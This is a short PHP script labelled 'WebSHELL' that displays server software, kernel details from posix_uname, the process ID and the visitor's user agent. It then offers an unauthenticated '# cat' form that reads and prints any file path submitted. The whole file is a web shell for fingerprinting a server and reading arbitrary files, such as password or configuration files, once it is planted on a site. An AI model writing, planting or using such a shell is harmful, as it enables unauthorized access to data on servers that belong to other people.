<?php
echo "<b>WebSHELL</b>";
echo "<hr>";
echo $_SERVER['SERVER_SIGNATURE'];
echo $_SERVER['SERVER_SOFTWARE']."<br>";
foreach (posix_uname() as $i){
    echo $i."<br>";
}
echo "PID: ".posix_getpid()."<br>";
echo "<hr>";
echo $_SERVER['HTTP_USER_AGENT']."<br>";
echo "<form action=rf.php method=post>";
echo "# cat <input type=text name=file>";
echo "<input type=submit value=Exec>";
echo "</form>";
$file=$_POST['file'];
if (strlen($file)!=0){
    if (file_exists($file)){
	if (is_readable($file)){
            $f=fopen($file,"r");
	    while ($line=fscanf($f,"%s\n")){
		foreach ($line as $i){
		    echo $i."<br>";	
		}
	    }
        }
	else{
	    echo "file not readable<br>";
	}
    }
    else{
	echo "file missing<br>";
    }
}
?>